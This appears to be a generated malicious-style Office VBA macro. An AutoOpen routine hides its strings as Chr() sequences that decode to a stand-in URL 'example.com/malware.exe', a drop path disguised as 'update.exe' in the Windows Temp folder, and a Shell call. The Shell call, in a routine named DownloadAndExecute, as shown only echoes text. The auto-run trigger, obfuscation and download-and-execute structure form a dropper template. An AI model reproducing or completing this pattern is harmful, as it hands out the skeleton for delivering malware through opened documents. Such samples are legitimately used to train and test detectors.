Sub AutoOpen()
    Dim v_gVwxNszC As String
    Dim v_pDZJRyPp As String
    
    v_gVwxNszC = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47) & Chr(101) & Chr(120) & Chr(97) & Chr(109) & Chr(112) & Chr(108) & Chr(101) & Chr(46) & Chr(99) & Chr(111) & Chr(109) & Chr(47) & Chr(109) & Chr(97) & Chr(108) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(46) & Chr(101) & Chr(120) & Chr(101)
    v_pDZJRyPp = Chr(67) & Chr(58) & Chr(92) & Chr(87) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(92) & Chr(84) & Chr(101) & Chr(109) & Chr(112) & Chr(92) & Chr(117) & Chr(112) & Chr(100) & Chr(97) & Chr(116) & Chr(101) & Chr(46) & Chr(101) & Chr(120) & Chr(101)
    Call DownloadAndExecute(v_gVwxNszC, v_pDZJRyPp)
End Sub
Sub DownloadAndExecute(url As String, path As String)
    Dim v_uYa2TNJA As String
    v_uYa2TNJA = Chr(99) & Chr(109) & Chr(100) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(32) & Chr(47) & Chr(99) & Chr(32) & Chr(101) & Chr(99) & Chr(104) & Chr(111) & Chr(32) & Chr(68) & Chr(111) & Chr(119) & Chr(110) & Chr(108) & Chr(111) & Chr(97) & Chr(100) & Chr(105) & Chr(110) & Chr(103) & Chr(46) & Chr(46) & Chr(46)
    Shell v_uYa2TNJA
End Sub